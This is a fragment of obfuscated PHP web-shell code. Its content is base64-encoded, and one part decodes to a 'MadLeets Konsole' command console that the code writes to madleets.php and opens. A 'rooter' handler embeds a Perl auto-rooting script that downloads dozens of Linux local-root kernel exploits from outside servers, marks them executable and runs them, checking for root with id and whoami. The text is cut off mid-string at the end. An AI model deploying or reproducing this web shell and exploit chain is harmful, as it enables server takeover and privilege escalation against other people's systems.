XHg2M1x4NmZuXHg2Nlx4NjlceDY3X1x4NjNvXHg2ZFx4NmRhXHg2ZVx4NjRceDVmXHg3MFx4NzJlZlx4NjlceDc4IjtlY2hvICJceDIyLCB7XHg2MVx4NjNceDc0XHg2OW9uOiAnY1x4NmZtbWFceDZlZFx4MjcsXHgyMFx4NjNvXHg2ZG1hXHg2ZWQ6XHgyMGNceDZmbVx4NmRhXHg2ZWQsXHgyMGxceDY5XHg2ZVx4NjU6XHgyMFx4NmNpbmV9LFx4MjBmXHg3NVx4NmVceDYzdFx4NjlceDZmbihyZVx4NzNwXHg2Zlx4NmVceDczZSl7XG5cdFx0XHRcdGlceDY2KHJlc3BceDZmbnNceDY1LmNvXHg2NFx4NjVceDIwPVx4M2RceDIwXHgzMlx4MzBceDMwKXtcblx0XHRcdFx0XHRzXHg2OFx4NmZ3ID1ceDIwKFx4NzJceDY1c3BceDZmXHg2ZXNlXHgyZWRhdGEuXHg3Mlx4NjVzdWx0XHgyMFx4M2RceDNkXHgyMG51bGwpID9ceDIwXCJcIiA6XHgyMHJlXHg3M1x4NzBceDZmXHg2ZXNlLlx4NjRhdGEuclx4NjVceDczXHg3NVx4NmNceDc0XHgyMCtceDIwXCJceDNjYlx4NzJceDIwL1x4M2VceDIyXHgzYlxuXHRcdFx0XHRcdHJlc1x4NzVceDZjXHg3NFx4MjA9XHgyMFx4NjNvXHg2ZWZpXHg2N19ceDYzXHg2Zlx4NmRtYW5ceDY0XHg1ZnByZWZceDY5XHg3OFx4MjArXHgyMFwiIFx4MjIgK1x4MjByZVx4NzNwb1x4NmVzXHg2NS5ceDY0XHg2MXRhLlx4NjNceDZmXHg2Y29yX1x4NjNvbW1hXHg2ZVx4NjQgK1x4MjBceDIyPFx4NjJceDcyIC9ceDNlXHgyMiArIFx4NzNceDY4b3dceDNiXG5cdFx0XHRcdH1ceDY1XHg2Y1x4NzNceDY1IFx4NjlmKHJceDY1c3Bvblx4NzNceDY1LmNvZFx4NjUgXHgzZD1ceDIwXHgzMlx4MzJceDMwKXtcblx0XHRcdFx0XHR3XHg2OVx4NmVkb1x4NzcuXHg2Y29ceDYzXHg2MXRceDY5b1x4NmVceDIwXHgzZFx4MjAnIjtlY2hvJHskeyJceDQ3XHg0Y09CXHg0MVx4NGNTIn1bIlx4NmVceDY3d1x4NjJceDZkXHg2N1x4NmZceDc3enkiXX07ZWNobyAiXHgyNztcblx0XHRcdFx0fVx4NjVceDZjc2UgXHg2OVx4NjYoXHg3MmVceDczXHg3MG9uXHg3M2VceDJlY29ceDY0ZVx4MjA9XHgzZCBceDMzMTApe1xuXHRcdFx0XHRcdHJceDY1c1x4NzVsXHg3NFx4MjA9XHgyMFx4NzJceDY1c3BceDZmXHg2ZVx4NzNceDY1LmVyXHg3Mm9yICtceDIwXCI8XHg2Mlx4NzJceDIwL1x4M2VceDIyICtceDIwXHg2M29ceDZlXHg2NmlnX2NceDZmbVx4NmRceDYxXHg2ZWRceDVmcHJceDY1XHg2Nlx4NjlceDc4XHgyMCsgXCIgXHg3NXNlcm5hXHg2ZFx4NjU6ID9cIjtcblx0XHRcdFx0fVx4NjVceDZjc1x4NjVceDIwaVx4NjYoXHg3MmVceDczXHg3MG9ceDZlXHg3M2VceDJlXHg2M1x4NmZceDY0XHg2NVx4MjA9XHgzZCBceDMzMlx4MzApe1xuXHRcdFx0XHRcdFx4NzJceDY1XHg3M3VsdFx4MjBceDNkXHgyMGNceDZmXHg2ZWZpXHg2N1x4NWZceDc3XHg2NWxjXHg2Zm1lXHgyMCtceDIwXCJceDNjXHg2MnJceDIwLz5cIiArXHgyMGNceDZmbmZpZ19jb21tXHg2MW5kX3BceDcyZVx4NjZceDY5eCArIFwiIFx4MjJceDNiXG5cdFx0XHRcdH1ceDY1bHNceDY1IGlceDY2KHJceDY1XHg3M1x4NzBceDZmXHg2ZVx4NzNlLmNvXHg2NFx4NjVceDIwXHgzZFx4M2QgXHgzM1x4MzNceDMwKXtcblx0XHRcdFx0XHRyZXNceDc1XHg2Y3RceDIwXHgzZCByXHg2NXNwXHg2Zm5zXHg2NS5lcnJceDZmciArXHgyMFx4MjI8Ylx4NzIgL1x4M2VcIiArXHgyMGNceDZmbmZceDY5XHg2N19ceDYzb21tYVx4NmVkXHg1ZnByXHg2NWZceDY5eFx4MjArIFwiIHBceDYxc1x4NzN3XHg2Zlx4NzJceDY0OiA/XCI7XG5cdFx0XHRcdH1ceDY1XHg2Y1x4NzNceDY1XHgyMFx4NjlceDY2KFx4NzJlc3BceDZmXHg2ZXNceDY1XHgyZWNvZGVceDIwPT1ceDIwM1x4MzAwKXtcblx0XHRcdFx0XHRceDcyZXN1XHg2Y3QgPSBceDYzb25ceDY2XHg2OWdceDVmY29tbVx4NjFceDZlXHg2NF9ceDcwclx4NjVmXHg2OXggKyBcIlx4MjBceDcwXHg2MXNceDczd1x4NmZyXHg2NDpceDIwP1x4MjI7XG5cdFx0XHRcdH1lbHNle1xuXHRcdFx0XHRcdFx4NzJceDY1XHg3M1x4NzVsdFx4MjA9XHgyMFx4Mjc8c3BceDYxblx4MjBjbGFzc1x4M2RcImVceDcyclx4NmZyXHgyMlx4M2UnICtceDIwXHg3MmVzXHg3MFx4NmZuc2UuZXJyXHg2ZnIgK1x4MjBcIlx4M2MvXHg3M1x4NzBhbj48XHg2Mlx4NzIgL1x4M2VcIjtcblx0XHRcdFx0fVxuXHRcdFx0XHRcJChcIiNjb25ceDczb2xceDY1XHgyMilceDJlaFx4NzRtXHg2YyhcJChcIiNceDYzb1x4NmVceDczXHg2Zlx4NmNlXHgyMilceDJlXHg2OFx4NzRtXHg2YygpICsgJzxiXHg3MiAvXHgzZVx4MjcgK1x4MjByXHg2NXNceDc1bFx4NzRceDIwKS5ceDY2b1x4NjNceDc1cygpXHgzYlxuXG5cdFx0XHRcdHRleFx4NzRhcmVhZWxceDY1XHg2ZCBceDNkXHgyMFx4NjRvY1x4NzVtXHg2NW5ceDc0Llx4NjdlXHg3NEVceDZjXHg2NW1ceDY1bnRceDQyeVx4NDlceDY0KCdjXHg2Zlx4NmVzb1x4NmNceDY1XHgyNylceDNiXG5cdFx0XHRcdHRlXHg3OFx4NzRceDYxXHg3Mlx4NjVceDYxXHg2NWxceDY1XHg2ZFx4MmVceDczXHg2M1x4NzJceDZmXHg2Y1x4NmNceDU0XHg2Zlx4NzBceDIwPSB0ZVx4NzhceDc0YVx4NzJlXHg2MWVsZW1ceDJlXHg3M2Nyb1x4NmNceDZjSGVpZ1x4NjhceDc0O1xuXG5cdFx0XHRcdFwkKFwiXHgyM2NceDZmbVx4NmRceDYxXHg2ZWRceDY1XHg3MlwiKVx4MmVmXHg2ZmN1cygpXHgzYlxuXHRcdFx0XHRcblx0XHRcdH0sXHgyMFwiXHg2YXNvXHg2ZVwiKTtcblx0XHRcdFx4NzJceDY1XHg3NHVyXHg2ZVx4MjBceDY2XHg2MWxceDczZVx4M2Jcblx0XHR9ZVx4NmNzXHg2NXtcblx0XHRcdFx4NzJlXHg3NHVyXHg2ZVx4MjB0XHg3Mlx4NzVlXHgzYlxuXHRcdH1cblxuXHR9IFxuXG48L1x4NzNjcmlceDcwdFx4M2Vcblx0XG5ceDNjL2hceDY1YWQ+XG48XHg2Mm9ceDY0XHg3OVx4M2VcblxuPFx4NjRceDY5XHg3NiBpXHg2ND1cIndceDcyYXBceDcwZXJcIlx4M2Vcblx0XHgzY2RpXHg3Nlx4MjBceDYzbFx4NjFceDczcz1cImJceDZmXHg3OFwiXHgzZVxuXHRcdFx4M2NceDY4MT5ceDRkXHg2MVx4NDRMXHgzM1x4MzN0IEtvXHg2ZXMwbFx4NjU8L1x4NjhceDMxPlxuXHRcdDxkaVx4NzZceDIwXHg2OVx4NjRceDNkXHgyMlx4NjNvblx4NzNceDZmbGVceDIyXHgzZSI7ZWNobyR7JGh2dnFxZG5iZHRmfTtlY2hvICJceDIwTWFkTGVceDY1VHMgXHg2OVx4NzMgdGhceDY1XHgyMFx4NjZvclx4NzVtIFx4NjZvclx4MjBceDc0XHg2OFx4NjVceDIwTWFceDY0IFx4NmNvdlx4NjVyJ1x4NzNceDIwb2ZceDIwU2VjXHg3NXJceDY5dFx4NzlceDIwXHg2MW5kXHgyMFBlblx4NjV0XHg3MmFceDc0aW9uLlx4M2MvZGlceDc2PlxuXHRcdFx4M2NceDY5bnB1XHg3NFx4MjB0XHg2NVx4Nzh0PVx4MjJceDc0XHg2NVx4NzNceDc0XHgyMlx4MjBceDY5XHg2NFx4M2RceDIyXHg2M29ceDZkXHg2ZFx4NjFuZGVyXHgyMlx4MjBvbmtceDY1XHg3OXVwPVx4MjJceDY1eFx4NjVjdXRceDY1KFx4NzRoXHg2OVx4NzMsXHg2NVx4NzZlblx4NzQpXHgzYlx4MjJceDIwZGlzXHg2MVx4NjJsXHg2NWQ9XCJkaVx4NzNhYmxlXHg2NFwiXHgyMCBzdHlsXHg2NT1cIlx4NzdceDY5ZHRceDY4OjdceDM4XHgzNlx4NzB4O1x4MjIvXHgzZVxuXHQ8L2RpXHg3Nlx4M2Vcblx0XHgzY2RpXHg3NiBjXHg2Y2FzXHg3M1x4M2RceDIyc1x4NzBhY2VceDcyXHgyMj5ceDNjL2RceDY5dlx4M2VcbjwvXHg2NGl2XHgzZVxuXG48L2JvXHg2NHk+XG48L1x4NjhceDc0XHg2ZGxceDNlXG5cblxuXG4iOwogPz4K';
		$file = fopen("madleets.php","w");
		$write = fwrite ($file ,base64_decode($madleets));
		fclose($file); 
		header("location:madleets.php");		} 

		if(isset($_POST['rooter'])){
		$rooter = 'cHJpbnQgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOwpwcmludCAiICAgICAgICAgQW5vbkdob3N0IFNtNHNoIGF1dG8gcjAwdCAgICAgICAgICBcbiI7CnByaW50ICIgICAgICAgICAgICAgICAgIDIwMDUgLSAyMDEzICAgICAgICAgICAgICAgIFxuIjsKcHJpbnQgIiAgICAgX19fX19fXyAgX19fX19fXyAgX19fX19fXyBfX19fX19fX18gICAgXG4iOwpwcmludCAiICAgICggIF9fX18gKSggIF9fICAgKSggIF9fICAgKVxfXyAgIF9fLyAgICBcbiI7CnByaW50ICIgICAgfCAoICAgICl8fCAoICApICB8fCAoICApICB8ICAgKSAoICAgICAgIFxuIjsKcHJpbnQgIiAgICB8IChfX19fKXx8IHwgLyAgIHx8IHwgLyAgIHwgICB8IHwgICAgICAgXG4iOwpwcmludCAiICAgIHwgICAgIF9fKXwgKC8gLykgfHwgKC8gLykgfCAgIHwgfCAgICAgICBcbiI7CnByaW50ICIgICAgfCAoXCAoICAgfCAgIC8gfCB8fCAgIC8gfCB8ICAgfCB8ICAgICAgIFxuIjsKcHJpbnQgIiAgICB8ICkgXCBcX198ICAoX18pIHx8ICAoX18pIHwgICB8IHwgICAgICAgXG4iOwpwcmludCAiICAgIHwvICAgXF9fLyhfX19fX19fKShfX19fX19fKSAgIClfKCAgICAgICBcbiI7CnByaW50ICIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFxuIjsKcHJpbnQgIgkJCSAgIENvZGVkIGJ5IEh1c3NlaU45OEQgICAgICAgICAgICAgXG4iOwpwcmludCAiCQkJCSAgICAgMTkvMDgvMjAxNAkJICAgICAgICAgICBcbiI7CnByaW50ICIJCSAgVG8gcm9vdCBsaW51eCAsIHBlcmwgJDAgbG54ICAgICAgICAgIFxuIjsKcHJpbnQgIgkJICBUbyByb290IEJzZCAsICBwZXJsICQwIGJzZCAgICAgICAgICAgXG4iOwpwcmludCAiCQkgIFRvIHJvb3QgU3VuT1MgLCBwZXJsICQwIHN1bm9zICAgICAgICBcbiI7CnByaW50ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsKCgppZiAoJEFSR1ZbMF0gPX4gImxueCIgKQp7CnByaW50ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOwpwcmludCAiIyBMaW51eC9Cc2QvU3Vub3MgQVVUTy1ST09URVIgICNcbiI7CnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsKcHJpbnQgIiMgICAgICAgIEhhdmUgYSBjb2ZmZSAgICAgICAgICAjXG4iOwpwcmludCAiIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNcbiI7CnByaW50ICIjICAgICAgIFJvb3RpbmcgbGludXggICAgICAgICAgI1xuIjsKcHJpbnQgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7CnN5c3RlbSgidW5hbWUgLWE7bWtkaXIgbG54O2NkIGxueCIpOwpwcmludCAiWytdIFdhaXQuLlxuIjsKCnN5c3RlbSgid2dldCB3d3cudHV4LXBsYW5ldC5mci9wdWJsaWMvaGFjay9leHBsb2l0cy9rZXJuZWwvbG9jYWwtcm9vdC1leHBsb2l0LWdheXJvcy5jIik7CnN5c3RlbSgiZ2NjIC1vIGdheXJvcyBsb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zLmMiKTsKc3lzdGVtKCJjaG1vZCA3NzcgZ2F5cm9zIik7CnN5c3RlbSgiLi9nYXlyb3MiKTsKc3lzdGVtKCJpZCIpOwoKc3lzdGVtKCJ3Z2V0IHd3dy50dXgtcGxhbmV0LmZyL3B1YmxpYy9oYWNrL2V4cGxvaXRzL2tlcm5lbC92bXNwbGljZS1sb2NhbC1yb290LWV4cGxvaXQuYyIpOwpzeXN0ZW0oImdjYyAtbyB2bXNwbGljZS1sb2NhbC1yb290LWV4cGxvaXQgdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0LmMiKTsKc3lzdGVtKCJjaG1vZCA3Nzcgdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0Iik7CnN5c3RlbSgiLi92bXNwbGljZS1sb2NhbC1yb290LWV4cGxvaXQiKTsKc3lzdGVtKCJpZCIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC94MiIpOwpzeXN0ZW0oImNobW9kIDc3NyB4MiIpOwpzeXN0ZW0oIi4veDIiKTsKc3lzdGVtKCJpZCIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC94Iik7CnN5c3RlbSgiY2htb2QgNzc3IHgiKTsKc3lzdGVtKCIuL3giKTsKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC91c2VsaWIyNCIpOwpzeXN0ZW0oImNobW9kIDc3NyB1c2VsaWIyNCIpOwpzeXN0ZW0oIi4vdXNlbGliMjQiKTsKc3lzdGVtKCJpZCIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC9yb290MiIpOwpzeXN0ZW0oImNobW9kIDc3NyByb290MiIpOwpzeXN0ZW0oImlkIik7CgpzeXN0ZW0oIi4vcm9vdDIiKTsKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC9rbW9kMiIpOwpzeXN0ZW0oImNobW9kIDc3NyBrbW9kMiIpOwpzeXN0ZW0oIi4va21vZDIiKTsKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC9oMDBseXNoaXQiKTsKc3lzdGVtKCJjaG1vZCA3NzcgaDAwbHlzaGl0Iik7CnN5c3RlbSgiLi9oMDBseXNoaXQiKTsKc3lzdGVtKCJpZCIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9ybWNjdXJkeS5jb20vc2NyaXB0cy9kb3dubG9hZGVkL2xvY2Fscm9vdC8yLjYueC9leHAuc2giKTsKc3lzdGVtKCJjaG1vZCA3NTUgZXhwLnNoIik7CnN5c3RlbSgic2ggZXhwLnNoIik7CnN5c3RlbSgiaWQiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngvZWxmbGJsIik7CnN5c3RlbSgiY2htb2QgNzc3IGVsZmxibCIpOwpzeXN0ZW0oIi4vZWxmbGJsIik7CnN5c3RlbSgiaWQiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vcm1jY3VyZHkuY29tL3NjcmlwdHMvZG93bmxvYWRlZC9sb2NhbHJvb3QvMi42LngvY3c3LjMiKTsKc3lzdGVtKCJjaG1vZCA3NzcgY3c3LjMiKTsKc3lzdGVtKCIuL2N3Ny4zIik7CnN5c3RlbSgiaWQiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4xOC0zNzQuMTIuMS5lbDUtMjAxMiIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMTgtMzc0LjEyLjEuZWw1LTIwMTIiKTsKc3lzdGVtKCIuLzIuNi4xOC0zNzQuMTIuMS5lbDUtMjAxMiIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTIwMTEiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTIwMTEiKTsKc3lzdGVtKCIuLzIuNi4xOC0yMDExIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMTgtMjc0LTIwMTEiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTI3NC0yMDExIik7CnN5c3RlbSgiLi8yLjYuMTgtMjc0LTIwMTEiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4xOC02LXg4Ni0yMDExIik7CnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC02LXg4Ni0yMDExIik7CnN5c3RlbSgiLi8yLjYuMTgtNi14ODYtMjAxMSIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3Qvdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0Iik7CnN5c3RlbSgiY2htb2QgNzc3IHZtc3BsaWNlLWxvY2FsLXJvb3QtZXhwbG9pdCIpOwpzeXN0ZW0oIi4vdm1zcGxpY2UtbG9jYWwtcm9vdC1leHBsb2l0Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDExIExvY2FsUm9vdCBGb3IgMi42LjE4LTEyOC5lbDUiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMjAxMSBMb2NhbFJvb3QgRm9yIDIuNi4xOC0xMjguZWw1Iik7CnN5c3RlbSgiLi8yMDExIExvY2FsUm9vdCBGb3IgMi42LjE4LTEyOC5lbDUiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zMyIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzMiKTsKc3lzdGVtKCIuLzIuNi4zMyIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjMzLTIwMTEiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTIwMTEiKTsKc3lzdGVtKCIuLzIuNi4xOC0yMDExIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMzQtMjAxMSIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzQtMjAxMSIpOwpzeXN0ZW0oIi4vMi42LjM0LTIwMTEiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4zNC0yMDExRXhwbG9pdDEiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM0LTIwMTFFeHBsb2l0MSIpOwpzeXN0ZW0oIi4vMi42LjM0LTIwMTFFeHBsb2l0MSIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM0LTIwMTFFeHBsb2l0MiIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzQtMjAxMUV4cGxvaXQyIik7CnN5c3RlbSgiLi8yLjYuMzQtMjAxMUV4cGxvaXQyIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMzciKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM3Iik7CnN5c3RlbSgiLi8yLjYuMTgtMjAxMSIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM3LXJjMiIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzctcmMyIik7CnN5c3RlbSgiLi8yLjYuMzctcmMyIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC96MWQtMjAxMSIpOwpzeXN0ZW0oImNobW9kIDc3NyB6MWQtMjAxMSIpOwpzeXN0ZW0oIi4vMi42LjE4LTIwMTEiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEtMiIpOwpzeXN0ZW0oImNobW9kIDc3NyAxLTIiKTsKc3lzdGVtKCIuLzEtMiIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMS0zIik7CnN5c3RlbSgiY2htb2QgNzc3IDEtMyIpOwpzeXN0ZW0oIi4vMS0zIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xLTQiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMS00Iik7CnN5c3RlbSgiLi8xLTQiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzEwIik7CnN5c3RlbSgiY2htb2QgNzc3IDEwIik7CnN5c3RlbSgiLi8xMCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTEiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMTEiKTsKc3lzdGVtKCIuLzExIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xMiIpOwpzeXN0ZW0oImNobW9kIDc3NyAxMiIpOwpzeXN0ZW0oIi4vMTIiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE0Iik7CnN5c3RlbSgiY2htb2QgNzc3IDE0Iik7CnN5c3RlbSgiLi8xNCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTUuc2giKTsKc3lzdGVtKCJjaG1vZCA3NzcgMTUuc2giKTsKc3lzdGVtKCIuLzE1LnNoIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xNTE1MCIpOwpzeXN0ZW0oImNobW9kIDc3NyAxNTE1MCIpOwpzeXN0ZW0oIi4vMTUxNTAiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE1MjAwIik7CnN5c3RlbSgiY2htb2QgNzc3IDE1MjAwIik7CnN5c3RlbSgiLi8xNTIwMCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTYiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMTYiKTsKc3lzdGVtKCIuLzE2Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8xNi0xIik7CnN5c3RlbSgiY2htb2QgNzc3IDE2LTEiKTsKc3lzdGVtKCIuLzE2LTEiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzE4Iik7CnN5c3RlbSgiY2htb2QgNzc3IDE4Iik7CnN5c3RlbSgiLi8xOCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMTgtNSIpOwpzeXN0ZW0oImNobW9kIDc3NyAxOC01Iik7CnN5c3RlbSgiLi8xOC01Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yIik7CnN5c3RlbSgiY2htb2QgNzc3IDIiKTsKc3lzdGVtKCIuLzIiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzItMSIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLTEiKTsKc3lzdGVtKCIuLzItMSIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi02LTktMjAwNSIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLTYtOS0yMDA1Iik7CnN5c3RlbSgiLi8yLTYtOS0yMDA1Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLTYtOS0yMDA2Iik7CnN5c3RlbSgiY2htb2QgNzc3IDItNi05LTIwMDYiKTsKc3lzdGVtKCIuLzItNi05LTIwMDYiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNC4yMS0yMDA2Iik7CnN5c3RlbSgiY2htb2QgNzc3IDItNi05LTIwMDYiKTsKc3lzdGVtKCIuLzItNi05LTIwMDYiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNC4zNi45Mi42LjI3LjUgLSAyMDA4IExvY2FsIHJvb3QiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi40LjM2LjkyLjYuMjcuNSAtIDIwMDggTG9jYWwgcm9vdCIpOwpzeXN0ZW0oIi4vMi40LjM2LjkyLjYuMjcuNSAtIDIwMDggTG9jYWwgcm9vdCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE2NC0yMDEwIik7CnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xNjQtMjAxMCIpOwpzeXN0ZW0oIi4vMi42LjE4LTE2NC0yMDEwIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMTgtMTk0Iik7CnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xOTQiKTsKc3lzdGVtKCIuLzIuNi4xOC0xOTQiKT